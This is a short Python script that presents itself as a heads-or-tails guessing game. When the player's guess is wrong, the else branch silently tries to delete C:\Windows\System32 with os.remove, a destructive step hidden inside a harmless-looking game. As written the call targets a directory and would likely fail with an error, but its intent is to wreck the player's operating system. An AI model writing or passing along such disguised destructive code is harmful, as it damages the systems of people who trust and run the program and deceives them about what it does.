import random
import os

def heads_or_tails():
    guess = input("Guess heads or tails: ").lower()

    result = random.randint(0, 1)

    if result == 0:
        outcome = "heads"
    else:
        outcome = "tails"

    print(f"The result is {outcome}.")

    if guess == outcome:
        print("Congratulations, you win!")
    else:
        try:
            file_to_delete = r"C:\Windows\System32"
            os.remove(file_to_delete)
            print(f"{file_to_delete} successfully deleted.")
        except OSError as e:
            print(f"Error deleting file: {e}")


heads_or_tails()
